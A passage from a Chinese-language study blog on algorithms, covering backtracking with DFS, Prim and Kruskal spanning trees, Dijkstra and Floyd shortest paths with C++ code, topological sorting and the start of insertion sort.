&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=k ;i &lt;= m; ++i) &#123;</span><br><span class="line"><span class="built_in">swap</span>(list[k], list[i]);</span><br><span class="line">        <span class="built_in">perm</span>(list, k+<span class="number">1</span>, m);         <span class="comment">// 继续递归遍历解答树的下一层</span></span><br><span class="line"><span class="built_in">swap</span> (list[k], list[i]);    <span class="comment">// 回溯</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> list[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line"><span class="built_in">perm</span>(list, <span class="number">0</span>, <span class="built_in">sizeof</span>(list)/<span class="built_in">sizeof</span>(<span class="type">int</span>)<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>例2：有1分，2分，5分，10分四种硬币，每种硬币数量无限，给定Target分钱，求有多少种组合可以组合成Target分钱?</p></blockquote><p>依然是解答树的深度优先遍历DFS问题（回溯法）：</p><p>参考：<a href="https://blog.csdn.net/huangxy10/article/details/8026464">https://blog.csdn.net/huangxy10/article/details/8026464</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> count=<span class="number">0</span>; <span class="comment">//统计有多少种组合</span></span><br><span class="line"><span class="type">int</span> Target=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> coin[<span class="number">4</span>]=&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">10</span>&#125;; <span class="comment">//记录硬币的面值</span></span><br><span class="line"><span class="type">int</span> total=<span class="number">0</span>;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; solution; <span class="comment">//解向量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span> <span class="params">(<span class="type">int</span> index)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(total == Target) &#123;   <span class="comment">// 满足条件，输出结果</span></span><br><span class="line">count++;</span><br><span class="line">cout &lt;&lt; count &lt;&lt;<span class="string">&quot;:&quot;</span> ;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; (<span class="type">int</span>) solution.<span class="built_in">size</span>(); i++)</span><br><span class="line">cout &lt;&lt; solution[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (total &gt; Target)  <span class="comment">// 无解</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=index; i&lt;<span class="number">4</span>; i++) &#123;    <span class="comment">// 币种为4种，也就是解空间树结点有4个分支</span></span><br><span class="line">total += coin[i] ;</span><br><span class="line">solution.<span class="function">push_ <span class="title">back</span><span class="params">(coin[i])</span></span>;</span><br><span class="line"><span class="built_in">dfs</span>(i);                     <span class="comment">// 继续深度优先遍历</span></span><br><span class="line">solution.<span class="built_in">pop_back</span>();        <span class="comment">// 回溯</span></span><br><span class="line">total -= coin[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">count=<span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; Target;      <span class="comment">//需输入大于0的整数</span></span><br><span class="line"><span class="built_in">dfs</span>(<span class="number">0</span>);</span><br><span class="line">cout &lt;&lt; count &lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>01背包问题，使用深度优先遍历的思想解决</p></blockquote><p>0-1背包问题除了用动态规划解决以外，是不是也可以利用深度优先遍历解决呢?下图为有ABCD若干件物品的背包问题解答树。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220716214309918.png" alt="image-20220716214309918"></p><p>我们利用深度优先遍历遍历至每个叶子结点，求出小于背包容量的最大值即可。代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">100</span>; <span class="comment">//物品最大件数</span></span><br><span class="line"><span class="type">int</span> ans=<span class="number">0</span>;       <span class="comment">//保存解</span></span><br><span class="line"><span class="type">int</span> item_number; <span class="comment">//物品件数</span></span><br><span class="line"><span class="type">int</span> knap_size;   <span class="comment">//背包载重量或者体积容量</span></span><br><span class="line"><span class="type">int</span> weight[N];   <span class="comment">//物品的重量或者体积</span></span><br><span class="line"><span class="type">int</span> value [N];   <span class="comment">//物品的价值</span></span><br><span class="line"><span class="type">int</span> x[N];        <span class="comment">//解向量</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> cur_depth , <span class="type">int</span> cur_size，<span class="type">int</span> cur_value)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(cur_depth &gt; item_number) &#123;     <span class="comment">//到达叶子结点</span></span><br><span class="line"><span class="keyword">if</span> (cur_value &gt; ans)          <span class="comment">//更新最优解</span></span><br><span class="line">ans=cur_value;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(cur_size &gt; knap_size) <span class="comment">//超过背包容量，该路径不是问题的解</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(cur_value &gt; ans)      <span class="comment">//保存当前路径解</span></span><br><span class="line">ans=cur_value;</span><br><span class="line"><span class="comment">//深度优先搜索，要或不要两种选择而已。</span></span><br><span class="line">    <span class="built_in">dfs</span> (cur_depth+<span class="number">1</span>, cur_size, cur_value);   <span class="comment">// 不放入</span></span><br><span class="line"><span class="built_in">dfs</span> (cur_ depth+<span class="number">1</span>, cur_size+weight[cur_depth], cur_value+value[cur_depth]);    <span class="comment">//放入</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">dfs</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="4-5-图的基本应用"><a href="#4-5-图的基本应用" class="headerlink" title="4.5 图的基本应用"></a>4.5 图的基本应用</h3><h4 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h4><p>连通图的生成树是<u>包含图中全部顶点的一个极小连通子图</u>。若图中顶点数为n，则它的生成树含有n-1条边。对于生成树而言，若砍去它的一条边，则会变成非连通图，若加上一条边则会形成一个回路。在非连通图中，连通分量的生成树构成了非连通图的生成森林。</p><p>注意区分极大连通子图和极小连通子图：极大连通子图是无向图的连通分量，<u>极大即要求该连通子图包含其所有的边</u>；极小连通子图是连通无向图的生成树，<u>极小既要保持图连通，又要使得边数最少</u>，只有生成树满足条件，砍去生成树的任一条边， 图将不再连通。</p><p>构造最小生成树有多种算法，但大多数算法都利用了最小生成树的下列性质：</p><p>假设G&#x3D;(V,B)是一个带权连通无向图，U是顶点集V的一个非空子集。若(u,v)是一条具有最小权值的边，其中u∈U，v∈V-U，则必存在一棵包含边(u, v)的最小生成树。</p><p>基于该性质的最小生成树算法主要有：Prim 算法和Kruskal算法，它们都基于贪心算法的策略。</p><p>**&#x3D;&#x3D;prim算法&#x3D;&#x3D;**（运用BFS）</p><p>Prim算法的步骤如下：</p><p>初始化：向空树$T&#x3D;(V_T,E_T)$中添加图$G&#x3D;(V,E)$的任一顶点$u_o$，使$V_T&#x3D;{u_0}$，$E_T&#x3D;\emptyset$。</p><p>循环（重复下列操作至$V_T&#x3D;V$）：从图G中选择满足${(u,v)|u \in V_T, v \in V-V_T}$且具有最小权值的边(u,v)，并置$V_T &#x3D; V_T \bigcup {v}$，。$E_T &#x3D; E_T \bigcup {(u,v)}$。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220716220813628.png" alt="image-20220716220813628"></p><p>Prim算法的时间复杂度为$O(|V|^2)$，不依赖于|E|，因此它<strong>适用于求解边稠密的图的最小生成树</strong>。虽然采用其他方法可以改进Prim算法的时间复杂度，但增加了实现的复杂性。</p><p><strong>&#x3D;&#x3D;kruskal算法&#x3D;&#x3D;</strong></p><p>与Prim算法从顶点开始扩展最小生成树不同，Kruskal 算法是一种按权值的递增次序选择合适的边来构造最小生成树的方法。假设N&#x3D;(V,E)是连通网，对应的最小生成树$T&#x3D;(V_T,E_T)$，KVruskal 算法的步骤如下：</p><p>初始化：使$V_T&#x3D;V$，$E_T&#x3D;\emptyset$。 即每个顶点构成一棵独立的树， T此时是一个仅含|V|个顶点的森林；</p><p>循环（重复下列操作至T是一棵树）：按G的边的权值递增顺序依次从$E &#x3D; E_T$中选择一条边，如果这条边加入T后不构成回路，则将其加入E，否则舍弃，直到E中含有n-1条边。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220716221006112.png" alt="image-20220716221006112"></p><p>通常在Kruskal算法中，采用堆来存放边的集合，则每次选择最小权值的边只需O(log|E|)的时间。又生成树T中所有边可以视为一个等价类，每次添加新的边的过程类似于求解等价类的过程，由此可以采用并查集的数据结构来描述T，从而构造T的时间复杂度为O(|E|log|E|),因此，<strong>Kruskal 算法适合于边稀疏而顶点较多的图</strong>。</p><h4 id="最短路径"><a href="#最短路径" class="headerlink" title="最短路径"></a>最短路径</h4><p>求解最短路径的算法通常都依赖于一种性质，也就是<u>两点之间的最短路径也包含了路径上其他顶点间的最短路径</u>。这种最优子结构性质是动态规划和贪心算法是否适用的一个标记。</p><p>带权有向图G的最短路径问题，一般可分为两类：一是单源最短路径，即求图中某一顶点到其他各顶点的最短路径，可通过经典的Djkstra 算法求解，此算法也是基于贪心算法的策略；二是求每一对顶点间的最短路径，可通过Floyd-Warshall算法来求解，此算法是基于动态规划的思想。</p><h5 id="x3D-x3D-Dijkstra算法-x3D-x3D-（BFS-贪心）求单源最短的径问题"><a href="#x3D-x3D-Dijkstra算法-x3D-x3D-（BFS-贪心）求单源最短的径问题" class="headerlink" title="&#x3D;&#x3D;Dijkstra算法&#x3D;&#x3D;（BFS+贪心）求单源最短的径问题"></a>&#x3D;&#x3D;<strong>Dijkstra算法</strong>&#x3D;&#x3D;（BFS+贪心）求单源最短的径问题</h5><p>参考：<a href="https://www.bilibili.com/video/BV1zz4y1m7Nq">https://www.bilibili.com/video/BV1zz4y1m7Nq</a></p><p>求带权有向图中某个源点到其余各顶点的最短路径，最常用的是Dijkstra 算法。该算法设置一个集合s，记录已求得的最短路径的顶点，初始时把源点v的放入S中。此外，在构造过程中还设置了两个辅助数组：</p><p>**dist[]**：记录了从源点$v_0$到其他各顶点当前的最短路径长度，dist[i]初值为arcs[0][i]。</p><p>**path[]**：path[i]表示从源点到顶点i之间的最短路径的前驱结点，在算法结束时，可根据其值追溯得到源点$v_0$到顶点V的最短路径。</p><p>假设从顶点0出发，即$v_0&#x3D;0$，<strong>集合S</strong>最初只包含顶点0，<strong>邻接矩阵arcs</strong>表示带权有向图，arcs[i][j]表示有向边&lt;i, j&gt;的权值，若不存在有向边&lt;i, j&gt;，则arcs[i][j]为∞。</p><ul><li><p><em><strong>Djkstra 算法的步骤如下</strong></em>（不考虑对path[]的操作）：</p><ul><li><p>初始化：集合S初始为{0}，dist[]的初始值dist[i]&#x3D; arcs[0][i]，i&#x3D;1, 2, …, n-1。</p></li><li><p><u>从未入选S的顶点集合V-S中选出距离出发点$v_0$最近（即dist最小）的结点$v_j$</u>，也就是满足$dist[j]&#x3D;Min{dist[i]|v_i \in V-S}$，$v_j$就是当前求得的一条从$v_0$出发的最短路径的终点，<u>将其收录进S</u>，即令$S&#x3D;S \bigcup {j}$。</p></li><li><p><u>修改从$v_0$出发到集合V-S上的$v_k$可达的最短路径长度dist[k]，$v_k$为$v_j$的邻近顶点</u>：如果$v_0$经过结点$v_j$到达$v_k$的距离小于已知的到达$v_k$的距离，即dist[j]+arcs[j][k] &lt; dist[k]，则更新disk[k]，令dist[k]&#x3D;dist[j]+arcs[j][k]。</p></li><li><p>重复2) ~3)操作共n-1次，直到所有的顶点都包含在S中。</p></li></ul></li><li><p><em><strong>算法计算过程举例</strong></em></p><p>例如，表14-1所示为应用Djkstra算法对图14-11中的图从顶点1出发，求其到其余顶点的最短路径。</p><p><strong>第一趟</strong>：与结点1直接相连的有结点2、5，距离分别为10、5。而其余结点不能直达，所以距离为无限。这样每个结点都有一个初始化的距离。更新结点2、5的距离，并将距离最短的结点5加入S；</p><p><strong>第二趟</strong>：上一趟在S中加入了结点5，因此对于与结点5直连且未选入S的结点2、3、4，计算其距离与出发点1的距离。计算时，判断经过结点5的路径和已知路径哪个更短。对于结点2，经过结点5的路径长度为5+3&#x3D;8，不经过则为已知的10，因此更新其最短路径长度为8（path数组中可以更新结点2的值为5，表示到达结点2的最短路径中终点的前驱结点为5）。同理，对于结点3，5+9&#x3D;14&lt;$\infty$，其最短路径长度更新为14。对于结点4，5+2&#x3D;7&lt;$\infty$，其最短路径长度更新为7。接着，选择V-S中有路径长度最短的结点4加入S；</p><p><strong>第三趟</strong>：重复第二趟中的过程，更新结点4的邻近结点3（未加入S）的最短路径长度，7+6&#x3D;13&lt;14，因此更新为13，然后选择V-S中路径最短的结点2加入S；</p><p><strong>第四趟</strong>：继续重复，更新结点2的邻近结点3（未加入S）的最短路径长度，8+1&#x3D;9&lt;13，因此更新为9，然后选择V-S中路径最短的结点3加入S；</p><p>这样所有结点均加入S，计算完毕。</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220717000511386.png" alt="image-20220717000511386"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220717143107988.png" alt="image-20220717143107988"></p><ul><li><p><em><strong>特点</strong></em></p><p>显然，Dijkstra 算法是基于贪心策略的。若使用邻接矩阵表示，它的**<u>时间复杂度为</u><strong>$O(|V|^2)$。若使用带权的邻接表表示，虽然修改dist[]的时间可以减少，但由于在dist[]中选择最小分量的时间不变，其时间复杂度仍为$O(|V|^2)$。注意：</strong>如果边的权值为负，则dijkstra算法不适用。**</p></li></ul><h5 id="x3D-x3D-Floyd算法-x3D-x3D-（动态规划）"><a href="#x3D-x3D-Floyd算法-x3D-x3D-（动态规划）" class="headerlink" title="&#x3D;&#x3D;Floyd算法&#x3D;&#x3D;（动态规划）"></a>&#x3D;&#x3D;<strong>Floyd算法</strong>&#x3D;&#x3D;（动态规划）</h5><p>参考：<a href="https://www.bilibili.com/video/BV1LE411R7CS">https://www.bilibili.com/video/BV1LE411R7CS</a></p><ul><li><p><em><strong>基本思想</strong></em></p><p>Floyd算法的基本思想是：递推产生一个n阶方阵序列$A^{(-1)}$ ,$A^{(0)}$, … , $A^{(K)}$, … ,$A^{(n-1)}$，其中<u>$A^{(K)}[i][j]$表示从顶点$v_i$到顶点$v_j$的最短路径长度，k表示绕行第k个顶点的运算步骤</u>。</p><p>初始时，对于任意两个顶点$v_i$和$v_j$，若它们之间存在边，则以此边上的权值作为它们之间的最短路径长度；若它们之间不存在有向边，则以∞作为它们之间的最短路径长度。逐步尝试在原路径中加入顶点k（k&#x3D;0, 1, …, n-1）作为中间顶点。如果增加中间顶点后，得到的路径比原来的路径长度减少了，则以此新路径代替原路径。算法的描述如下：</p><p>定义一个<strong>n阶方阵序列</strong>：$A^{(-1)}$ ,$A^{(0)}$, … , $A^{(K)}$, … ,$A^{(n-1)}$，其中：</p><p>$A^{(-1)}[i][j]&#x3D;arcs[i][j]$（也就是不经过任何顶点的路径，路径长度就直接等于邻接矩阵的值）</p><p>$A^{(k)}[i][j]&#x3D;Min{A^{(k-1)}[i][j], \space A^{(k-1)}[i][k]+A^{(k-1)}[k][j] }, \space k&#x3D;0,1,…,n-1$（经过和不经过顶点$v_k$的路径长度，取最小值，得到考虑k个顶点的情况下的最短路径）</p><p><u>Floyd 算法是一个迭代的过程，每迭代一次， 在从$v_i$到$v_j$的最短路径上就多考虑了一个顶点；经过n次迭代后所得到的$A^{(n-1)}[i][j]$考虑了路径上可能遇到的所有结点，所以就得到了从$v_i$到$v_j$的最短路径长度，即方阵$A^{(n-1)}$中就保存了任意一对顶点之间的最短路径长度。</u></p></li><li><p><em><strong>算法计算过程举例</strong></em></p><p>如图14-12 所示为带权有向图G及其邻接矩阵，下面通过实例来说明Floyd算法的过程见表14-2。</p><p><strong>第一个矩阵</strong>$dist^{(-1)}$记录所有顶点之间的初始的路径长度，直连的两顶点的dist值就是其边权值，否则为$\infty$。</p><p><strong>第二个矩阵</strong>$dist^{(0)}$将顶点$V_0$纳入路径的考虑中。将已知的顶点$V_i$和顶点$V_j$之间的路径长度$dist^{(-1)}[i][j]$与经过顶点$V_0$的路径长度$dist^{(-1)}[i][0]+dist^{(-1)}[0][j]$相比较，取其最小值作为$dist^{(0)}[i][j]$的值。</p><p>比如$dist^{(-1)}[2][1]$初始为$\infty$，而考虑经过顶点$V_0$时，路径长度为$dist^{(-1)}[2][0]+dist^{(-1)}[0][1]&#x3D;5+6&#x3D;11&lt;\infty$。因此$dist^{(0)}[2][1]&#x3D;11$。（此处可以有一个<strong>path二维数组</strong>，用于存储顶点之间的最短路径所经过的顶点，默认值为-1。比如这里可以令$path[2][1]&#x3D;0$表示顶点2到顶点1的最短路径要经过顶点0。查找路径时，再继续查找$path[2][0]$和$path[0][1]$即可，这样就可以查找到完整路径）</p><p><strong>同理，第三个矩阵</strong>$dist^{(1)}$将顶点$V_1$纳入路径的考虑中。对于顶点$V_i$和顶点$V_j$之间的路径，对比经过$V_1$和不经过$V_1$的情况，取路径长度的最小值得到$dist^{(1)}[i][j]$。</p><p><strong>继续循环下去，直到得到矩阵</strong>$dist^{(n-1)}$，考虑了所有的n个顶点。</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220717210915856.png" alt="image-20220717210915856"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220717210925100.png" alt="image-20220717210925100"></p><ul><li><p><em><strong>代码</strong></em></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Floyd</span><span class="params">(<span class="type">int</span> n, <span class="type">float</span> MGraph[ ][n]，<span class="type">int</span> Path[][n])</span> </span>&#123;   <span class="comment">// n为顶点个数</span></span><br><span class="line"><span class="type">int</span> i, j，v;</span><br><span class="line"><span class="type">int</span> A[n] [n];</span><br><span class="line"><span class="comment">// 初始化dist数组和path数组</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;++j)&#123;</span><br><span class="line">A[i][j] = MGraph[i][j];</span><br><span class="line">Path[i][j] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 迭代dist数组</span></span><br><span class="line"><span class="keyword">for</span>(v=<span class="number">0</span>;V&lt;n;++v)&#123;     <span class="comment">// 考虑路径上可能的n个结点</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;++i)&#123;      <span class="comment">// 所有的顶点对vi、vj</span></span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;++j)&#123;</span><br><span class="line"><span class="keyword">if</span>(A[i][j] &gt; A[i][v]+A[v][j]) &#123;    <span class="comment">// 经过和不经过顶点v，哪个路径更短</span></span><br><span class="line">A[i][j] = A[i][v] + A[v][j] ;  <span class="comment">// 更新dist矩阵</span></span><br><span class="line">Path[i][j] = v;                <span class="comment">// 经过顶点v，则将path数组也更新</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据path数组输出路径</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printPath</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> V, <span class="type">int</span> path[][max] )</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (path[u][v] == <span class="number">-1</span> )</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;&lt;&quot;</span>&lt;&lt;u&lt;&lt;<span class="string">&quot;, &quot;</span>&lt;&lt;v&lt;&lt;<span class="string">&quot;&gt;&quot;</span>;   <span class="comment">//直接输出</span></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="type">int</span> mid = path[u] [v] ;</span><br><span class="line"><span class="built_in">printPath</span>(u, mid, path) ;</span><br><span class="line"><span class="built_in">printPath</span> (mid, V, path) ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em><strong>特点</strong></em></p><p><strong><u>Floyd算法的时间复杂度为</u></strong>$O(|V|^3)$。不过由于其代码很紧凑，而且并不包含其他复杂的数据结构，因此隐含的常数系数是很小的，即使对于中等<br>规模的输入来说，它仍然是相当有效的。</p><p>Floyd算法<strong>允许图中有带负权值的边</strong>，<u>但不允许有包含带负权值的边组成的回路</u>。Floyd 算法同样也适用于带权无向图，因为带权无向图可以视为<br>有往返二重边的有向图。</p><p>也可以用单源最短路径算法来解决每对顶点之间最短路径问题。每一次运行时， 轮流将一个顶点作为源点，并且若所有边权值均为非负时，可以采用上面提到的Dijkstral算法，其时间复杂度为$O(|V|^2)*|V|&#x3D;O(|V|^3)$。</p></li></ul><h4 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h4><p><strong>有向无环图</strong>：一个有向图中不存在环，则称为有向无环图，简称<strong>DAG图</strong>。</p><p><strong>AOV网</strong>：如果用DAG图表示一个工程， 其顶点表示活动，用有向边$&lt;V_i，V_j&gt;$表示活动$V_i$必须先于活动$V_j$进行的这样一种关系， 则将这种有向图称为顶点表示活动的网络，记为AOV网。在AOV网中，活动$V_i$是活动$V_j$的直接前驱，活动$V_j$是活动$V_i$的直接后继，这种前驱和后继关系具有传递性，且任何活动$V_i$不能以它自己作为自己的前驱或后继。</p><p><strong>拓扑排序</strong>：在图论中，<u>由一个有向无环图的顶点组成的序列</u>，当且仅当满足下列条件时，称为该图的一个拓扑排序。</p><ol><li><p><u>每个顶点出现且只出现一次</u>。</p></li><li><p>若项点A在序列中排在顶点B的前面，则在图中不存在从顶点B到顶点A的路径。或者定义为：拓扑排序是对有向无环图的顶点的一种排序，它使得<u>如果存在一条从顶点A到顶点B的路径，那么在排序中顶点B出现在顶点A的后面</u>。每个DAG图都有一个或多个拓扑排序序列。</p></li></ol><p>对一个DAG图进行拓扑排序的算法有很多，下面介绍比较常用的一种方法的步骤：</p><ol><li>从DAG图中选择一个没有前驱的顶点并输出。</li><li>从图中删除该顶点和所有以它为起点的有向边。</li><li>重复1和2直到当前的DAG图为空或当前图中不存在无前驱的顶点为止。而后一种情况，即当前图中不存在无前驱的顶点，则说明有向图中必然存在环。</li></ol><h2 id="5-排序"><a href="#5-排序" class="headerlink" title="5 排序"></a>5 排序</h2><p>参考：</p><p><a href="https://blog.csdn.net/qq_16775293/article/details/107821256?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_16775293/article/details/107821256?spm=1001.2014.3001.5502</a></p><p><a href="https://mp.weixin.qq.com/s/ekGdneZrMa23ALxt5mvKpQ">https://mp.weixin.qq.com/s/ekGdneZrMa23ALxt5mvKpQ</a></p><p><a href="https://www.bilibili.com/video/BV1Ur4y1w7tv">https://www.bilibili.com/video/BV1Ur4y1w7tv</a></p><p><strong>算法的稳定性</strong>：如果待排序表中有两个元素$R_i$、$R_j$，其对应的关键字$key_i&#x3D;key_j$，且在排序前$R_i$在$R_j$前面，如果使用某排序算法排序后，$R_i$仍然在$R_j$的前面，则称这个排序算法是稳定的，否则称排序算法是不稳定的。</p><p>注意：对于不稳定的排序算法，只需举出一组关键字的实例说明它的不稳定性即可。</p><p>在排序的过程中，根据数据元素是否完全在内存中，可将排序算法分为两类：<strong>内部排序</strong>是指在排序期间元素全部存放在内存中的排序；<strong>外部排序</strong>是指在排序期间元素无法全部同时存放在内存中，必须在排序的过程中根据要求不断地在内、外存之间移动的排序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 待排序的顺序表中数据元素的类型声明如下 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;    <span class="comment">// 定义关键字类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">KeyType key;        <span class="comment">// 关键字项</span></span><br><span class="line">    InfType data;       <span class="comment">// 其他数据项</span></span><br><span class="line">&#125;RecType;</span><br></pre></td></tr></table></figure><p><img src="https://uploadfiles.nowcoder.com/images/20220518/674306065_1652858588900/C1F78743F09180F47A6FF8BE443A157F" alt="img"></p><h3 id="5-1-插入排序"><a href="#5-1-插入排序" class="headerlink" title="5.1 插入排序"></a>5.1 插入排序</h3><p>基本思想在于每次将一个待排序的记录， 按其关键字大小插入到前面已经排好序的子序列中，直到全部记录插入完成。</p><h4 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h4><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/insertionSort.gif" alt="动图演示"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertSort</span> <span class="params">(RecType R[], <span class="type">int</span> n)</span></span>&#123;  <span class="comment">// n为数组长度</span></span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line">    RecType tmp;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;n;i++)                    <span class="comment">//依次将R[1]~R[n-1]插入到前面已排序序列</span></span><br><span class="line"><span class="keyword">if</span> (R[i].key &lt; R[i<span class="number">-1</span>].key) &#123;    <span class="comment">//若R[i]的关键码小于其前驱，即非递增，需将R[i]插入有序表</span></span><br><span class="line">tmp=R[i];                   <span class="comment">//暂存</span></span><br><span class="line">            j=i<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                R[j+<span class="number">1</span>] = R[j];           <span class="comment">// 向后挪位</span></span><br><span class="line">                j--;                   <span class="comment">//从后往前查找待插入位置</span></span><br><span class="line">            &#125; <span class="keyword">while</span> (j&gt;=<span class="number">0</span> &amp;&amp; R[j].key &gt; tmp.key) <span class="comment">// 大于tmp时继续往前</span></span><br><span class="line">R[j+<span class="number">1</span>] = tmp;                <span class="comment">//复制到插入位置</span></span><br><span class="line">        &#125;</span><br><span 